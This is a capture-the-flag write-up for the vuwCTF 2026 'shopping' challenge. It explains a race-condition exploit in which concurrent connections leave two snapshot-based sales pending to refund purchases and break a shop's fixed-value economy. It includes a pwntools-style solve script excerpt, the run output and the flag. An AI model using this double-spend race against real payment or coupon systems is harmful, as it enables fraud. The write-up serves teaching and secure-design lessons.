# shopping — vuwCTF 2026 (pwn)

> You're heard rumours of a flag store in town, with a flag for this very CTF. You'll need to
> haggle with the wily merchant with the coins in your pocket if you want to walk away with it
>
> `openssl s_client -quiet -connect shopping-434bcc9f695c4cd3.challenges.2026.vuwctf.com:9969`
> (pwntools: add `ssl=True` to `remote()`)

**Flag:** `VuwCTF{master_merchant_moose_meticulously_meddled_with}`

**TL;DR** — The shop is a closed economy where buying and selling are exact inverses, so your net
worth is pinned at the starting `$5` and the goal costs `$9`. But money and inventory are **global
across concurrent connections**, and the sell flow **snapshots your post-sale balance at menu time
and assigns it on confirm** — so anything you spend on a second connection while a sale sits pending
gets refunded. The anti-race guard only fires on same-type purchases, and the "1 sell per sitting"
allowance is only consumed on a *successful* confirm, so **two sales can be left pending at once**
and both cashed in: `$5` → net worth `$10` → 3 cloth flags → flag.

---

## Table of contents

- [Files](#files)
- [First contact](#first-contact)
- [The economy is a closed system](#the-economy-is-a-closed-system)
- [Mapping the interface](#mapping-the-interface)
  - [The menu parser is airtight](#the-menu-parser-is-airtight)
  - [Every transaction is two-phase](#every-transaction-is-two-phase)
- [Bug 1: the state is global](#bug-1-the-state-is-global)
- [Bug 2: buy re-validates, sell does not](#bug-2-buy-re-validates-sell-does-not)
- [The guard, and the hole in it](#the-guard-and-the-hole-in-it)
- [Why one refunded sale is not enough](#why-one-refunded-sale-is-not-enough)
- [Bug 3: the sell allowance is consumed too late](#bug-3-the-sell-allowance-is-consumed-too-late)
- [The full chain](#the-full-chain)
- [Solution script](#solution-script)
- [Running it](#running-it)
- [Dead ends](#dead-ends)
- [Root cause and lessons](#root-cause-and-lessons)

---

## Files

No binary, no source — this one is pure black-box protocol work against a TLS service.

| File | Notes |
| --- | --- |
| `solve.py` | solution script (this write-up's exploit) |
| `WRITEUP.md` | this document |

Everything below was derived by probing the live service, so descriptions of the server's
internals are **inferred from observable behaviour**, not read off source.

## First contact

```console
$ openssl s_client -quiet -connect shopping-...vuwctf.com:9969
Welcome to my fantastic, fabulous flag emporium. I love flags!
If you want a paper or cloth flag I'm the person to talk to.
If you can show me 3 cloth flags, as one flag lover to another, I'll give you a flag for your
competition, on the house.

You have $5, 0 paper flags, and 0 cloth flags.
What do you want to do?
1) You can buy a paper flag for $1
2) You can buy a cloth flag for $3
3) Sell a paper flag back to merchant for $1 (limit 1 total sell back)
4) Sell a cloth flag back to merchant for $3 (limit 1 total sell back)
5) Show 3 cloth flags to get the competition flag
6) Leave and come back later (reset challenge)
```

> **Gotcha:** piping `/dev/null` into `s_client` makes it exit before the banner is flushed. The
> service is interactive and never prints a prompt character, so it is far easier to drive from
> pwntools with `ssl=True` and sync on the menu's last line.

## The economy is a closed system

| Item | Buy | Sell back | Net |
| --- | --- | --- | --- |
| paper flag | `-$1` | `+$1` | `0` |
| cloth flag | `-$3` | `+$3` | `0` |

Define **net worth** as `money + paper*1 + cloth*3`. Every legitimate operation preserves it:
buying converts dollars into an equally-valued flag, selling converts it back. You start at
`$5`, and the win condition — 3 cloth flags — is worth `$9`.

> Net worth is invariant, it starts at 5, and the goal needs 9. **The intended solution must
> break the invariant**, not find a clever purchase order. There is no purchase order.

That also explains why the sell-back options exist at all despite being economically pointless:
they are not there to help you, they are there because the *sell* code path is the vulnerable one.

## Mapping the interface

### The menu parser is airtight

The first instinct is to look for an integer bug in the menu (negative index, overflow, a hidden
option 7). There isn't one — every non-`1..6` input is rejected identically:

```
input        reply
------------ ---------------------------
0            Sorry, that's not recognised
7 / 8 / 99   Sorry, that's not recognised
-1           Sorry, that's not recognised
2147483647   Sorry, that's not recognised
-2147483648  Sorry, that's not recognised
+2 / 02      Sorry, that's not recognised     <- not a lenient atoi()
1.5 / abc    Sorry, that's not recognised
"" (empty)   Sorry, that's not recognised
"1 1"        Sorry, that's not recognised     <- no quantity argument
```

`+2` and `02` being rejected is informative: this is a strict string comparison or a strict
integer parse, not `atoi()`. There is no arithmetic to abuse here. Likewise the sell handlers
bounds-check inventory properly, so there is no "sell what you don't own" underflow:

```
> 4
Sorry, you don't have any cloth flags to sell right now
```

So the bug is not in parsing or in any single handler. It has to be in the *sequencing*.

### Every transaction is two-phase

Both buying and selling split into **select** then **confirm**, which immediately makes the
window between them interesting:

```
> 2
Confirm purchase of a cloth flag for $3? [y/N]

> 3
After selling this flag, you will have $5.
Confirm? [y/N]
```

Note the asymmetry in what the two prompts say. The buy prompt quotes a *price*. The sell prompt
quotes a **precomputed resulting balance** — the server has already worked out `$5` and is holding
it. That is a very loud hint that the number is stored across the round trip rather than
recomputed at confirm time.

## Bug 1: the state is global

This fell out by accident. While testing the confirm flow I opened a *fresh* connection and it
greeted me with the state I had left behind on the previous, already-closed one:

```console
$ python3 -c 'connect, buy a cloth flag, disconnect'
You have $2, 0 paper flags, and 1 cloth flags.

$ python3 -c 'connect fresh, do nothing'
You have $2, 0 paper flags, and 1 cloth flags.     <-- not a new session!
```

Money and inventory live in one shared object for the whole instance, not per connection. And
crucially, connections are served **concurrently** — one connection can sit parked at a `[y/N]`
prompt while another connection transacts freely:

```
A: 3   -> "After selling this flag, you will have $5. Confirm? [y/N]"     (A parks here)
B: 1   -> "Confirm purchase of a paper flag for $1? [y/N]"                (B is served anyway)
B: y   -> "You have $3, 2 paper flags, and 0 cloth flags."
```

So we have a shared mutable singleton plus a two-phase transaction. That is a TOCTOU waiting to
happen — the only question is which phase trusts stale data.

## Bug 2: buy re-validates, sell does not

Both paths were tested the same way: park a transaction at its confirm prompt, mutate the global
balance from another connection, then confirm.

**Buying re-checks the live balance and correctly refuses:**

```
A: 2      (with $5 available)  -> "Confirm purchase of a cloth flag for $3? [y/N]"
B: buy 5 paper flags           -> "You have $0, 5 paper flags, and 0 cloth flags."
A: y                           -> "Sorry, since beginning this transaction, you ran out of money."
```

**Selling assigns its stale snapshot and hands back money that was already spent:**

```
reset                          -> $5, 0p, 0c
A: 1, y   (buy paper)          -> $4, 1p, 0c
A: 3      (pend paper sale)    -> "After selling this flag, you will have $5. Confirm? [y/N]"
B: 2, y   (buy a cloth flag)   -> $1, 1p, 1c
A: y      (confirm the sale)   -> $5, 0p, 1c            <-- balance *assigned* back to $5
```

Read that last line carefully. We spent `$3` on a cloth flag and still ended the sequence with the
full `$5` — and we kept the cloth flag. Net worth went from `$5` to `$8`. The sale did
`money = snapshot` instead of `money += price`, so every dollar spent inside the window was
refunded.

The generalised primitive:

> **Gain = whatever you spend on other connections between selecting a sale and confirming it.**

## The guard, and the hole in it

The author did anticipate this. Doing the same thing but buying a *paper* flag mid-window trips a
guard:

```
A: 3      (pend paper sale)    -> "After selling this flag, you will have $5. Confirm? [y/N]"
B: 1, y   (buy a PAPER flag)   -> $3, 2p, 0c
A: y                           -> "The merchant doesn't trust someone who buys a paper flag in a
                                    conversation about selling one. The merchant isn't buying it"
```

The message names the *type*: **"buys a paper flag ... about selling one"**. The guard is scoped
to the flag type being sold, so it watches paper purchases during a paper sale and ignores
everything else. Buying **cloth** during a **paper** sale — which is exactly what we want — walks
straight past it. The check that should have been "did the global state change at all?" was
written as "did the thing I'm selling get bought?"

## Why one refunded sale is not enough

Working the numbers for a single exploited sale, starting from `$5`:

| Step | money | paper | cloth | net worth |
| --- | --- | --- | --- | --- |
| start | 5 | 0 | 0 | 5 |
| buy paper (need a flag to sell) | 4 | 1 | 0 | 5 |
| pend paper sale — snapshot `$5` | 4 | 1 | 0 | 5 |
| buy cloth mid-window | 1 | 1 | 1 | 5 |
| confirm sale → `money := 5` | 5 | 0 | 1 | **8** |

Net worth `$8`, one cloth flag, and the sell allowance is now spent. The remaining `$5` buys one
more cloth flag (`$2`, 2 cloth) and then stalls — `$2` is not `$3`.

The ceiling is structural. The gain equals what you can spend inside the window, the window
starts with at most `$4` (you had to buy the sale token), and the only thing you may buy is cloth
at `$3` — the leftover `$1` can only buy paper, which trips the guard. So **one sale caps net
worth at `$8`**, one dollar short.

## Bug 3: the sell allowance is consumed too late

The "limit 1 total sell back" is real, and it is stricter than advertised — it is a *single*
allowance shared by both flag types, and it is global per sitting rather than per connection.
Even a brand-new connection is refused after a successful sale:

```
You can only sell a single flag in one sitting before the merchant gets annoyed at your antics.
Perhaps if you leave and come back he'll be a bit more jovial
```

("Leave and come back" is menu option `6`, which does reset the allowance — but it also resets
money and inventory to `$5, 0, 0`, so it can never bank a profit.)

The hole: the allowance is only debited on a **successful confirm**, not when you select the
menu item. Evidence — after a sale was rejected by the guard, the allowance was still available
to a different connection. So the check is:

```
select sale  ->  is the allowance still available?   (read-only)
confirm sale ->  apply snapshot, THEN spend the allowance
```

Which means **two sales can both pass the check before either one confirms**:

```
A: 3   -> "After selling this flag, you will have $4. Confirm? [y/N]"
C: 3   -> "After selling this flag, you will have $4. Confirm? [y/N]"     <-- both armed
```

Two independent refunds. That is the extra `$2` of headroom needed to clear `$9`.

## The full chain

Buy **two** paper flags first — a pending sale requires a flag of that type to exist, and paper is
the cheapest possible sale token at `$1`. Then arm both sales before spending anything.

| Step | money | paper | cloth | net worth |
| --- | --- | --- | --- | --- |
| reset | 5 | 0 | 0 | 5 |
| buy paper ×2 | 3 | 2 | 0 | 5 |
| pend sale **A** and sale **C** (both snapshot `$4`) | 3 | 2 | 0 | 5 |
| buy cloth #1 | 0 | 2 | 1 | 5 |
| confirm **A** → `money := 4` | 4 | 1 | 1 | **8** |
| buy cloth #2 | 1 | 1 | 2 | 8 |
| confirm **C** → `money := 4` | 4 | 0 | 2 | **10** |
| buy cloth #3 | 1 | 0 | 3 | 10 |
| show 3 cloth flags | — | — | — | 🏳️ |

Four connections total: one to set up, two to hold the armed sales, one to do the buying. The
ordering matters — each sale must be confirmed *after* a purchase has drained the balance, since
the refund is what recovers it.

```
Oh very impressive collection you've amassed
VuwCTF{master_merchant_moose_meticulously_meddled_with}
```

## Solution script

The full script is [`solve.py`](solve.py). Structure:

* A small `Merchant` class wraps one connection. Because the service prints no prompt character,
  replies are framed by reading until either the confirm question (`[y/N]`) or the last line of the
  re-printed menu, rather than by fixed sleeps.
* The exploit body mirrors the table above, and every step is asserted against the expected
  `(money, paper, cloth)` triple — this is a race, so if the interleaving ever slips, the script
  says so and exits instead of printing a confusing trace.
* The running "net worth" figure is printed at each step, so the two jumps (`5 → 8 → 10`) that
  break the conservation law are visible in the output.

The important part, with the noise stripped out:

```python
main = conn('main'); main.do(RESET)             # $5, 0p, 0c
for _ in range(2):
    main.do(BUY_PAPER); main.confirm()          # $3, 2p, 0c  - two sale tokens

a, c = conn('sale-A'), conn('sale-C')
a.do(SELL_PAPER)                                # armed, snapshot $4
c.do(SELL_PAPER)                                # armed, snapshot $4 (allowance not spent yet)

buyer = conn('buyer')
buyer.do(BUY_CLOTH); buyer.confirm()            # $0, 2p, 1c
a.confirm()                                     # $4, 1p, 1c   <- refund #1
buyer.do(BUY_CLOTH); buyer.confirm()            # $1, 1p, 2c
c.confirm()                                     # $4, 0p, 2c   <- refund #2
buyer.do(BUY_CLOTH); buyer.confirm()            # $1, 0p, 3c
print(buyer.do(CLAIM))
```

## Running it

```console
$ python3 solve.py
[*] target: shopping-434bcc9f695c4cd3.challenges.2026.vuwctf.com:9969 (ssl=True)
[*] reset                      $5  0 paper  0 cloth   (net worth $5)
[*] buy paper #1               $4  1 paper  0 cloth   (net worth $5)
[*] buy paper #2               $3  2 paper  0 cloth   (net worth $5)
[*] two paper sales pending, each snapshotting a $4 balance
[*] buy cloth #1               $0  2 paper  1 cloth   (net worth $5)
[*] cash in sale A             $4  1 paper  1 cloth   (net worth $8)
[*] buy cloth #2               $1  1 paper  2 cloth   (net worth $8)
[*] cash in sale C             $4  0 paper  2 cloth   (net worth $10)
[*] buy cloth #3               $1  0 paper  3 cloth   (net worth $10)
[+] FLAG: VuwCTF{master_merchant_moose_meticulously_meddled_with}
```

The script resets the shop first, so it is safe to re-run.

## Dead ends

* **Integer / parser abuse on the menu.** Nothing gets through — see the table above. `+2` and
  `02` being rejected rules out a lenient `atoi()`.
* **Selling flags you don't own.** Properly bounds-checked (`"Sorry, you don't have any cloth
  flags to sell right now"`), so no negative-count underflow into a huge unsigned value.
* **Classic double-spend on the buy path.** The obvious first attempt: park three connections at
  "Confirm purchase of a cloth flag for `$3`?" while holding `$5`, then confirm all three and go
  negative. It fails — the buy path re-checks the *live* balance at confirm time and refuses with
  `"Sorry, since beginning this transaction, you ran out of money."` Only the sell path trusts its
  snapshot. Worth noting this failure did *not* mean "no race here"; it meant the race was on the
  other path.
* **Farming the one-sale trick in a loop.** Repeating the single-sale exploit looks like it should
  stack, but the allowance is global per sitting and only `6` (full reset) clears it — and that
  wipes the profit too. The fix isn't to repeat the trick across sittings, it's to arm both sales
  *within* one sitting before either confirms.
* **Selling cloth instead of paper.** Symmetric on paper, worse in practice: selling cloth means
  the guard blocks cloth purchases in the window, so you can only buy paper — netting `$7` and
  destroying a cloth flag you wanted to keep.

## Root cause and lessons

Three ordinary-looking decisions that are each defensible alone:

1. **Shared mutable state with no session scoping.** The shop state is one global object served to
   concurrent connections, so "my session" is a fiction.
2. **Snapshot-then-assign across a user round trip.** The sell path computes the result up front to
   print a friendly `"you will have $5"` and then *assigns* that value on confirm. Rendering a
   preview is fine; committing the preview is not. The buy path gets this right by re-checking, and
   the contrast between the two is the whole challenge.
3. **A guard that checks the wrong thing, and a limit debited on the wrong edge.** The anti-race
   check asks "was this flag type bought?" instead of "did the state I snapshotted change?", and
   the sell allowance is spent at commit rather than reserved at select — so two transactions can
   both hold a right that only one of them should get.

The reusable lesson is that a two-phase transaction over shared state has to **re-validate every
precondition at commit, and reserve limited resources at select.** The merchant validated
affordability at commit but not the balance he'd promised; he reserved nothing at select. Both
halves were needed, and getting one right in the buy path while missing it in the sell path is
exactly the kind of asymmetry worth grepping for in real code review — this is the same bug class
as a coupon that can be redeemed twice by opening two browser tabs.
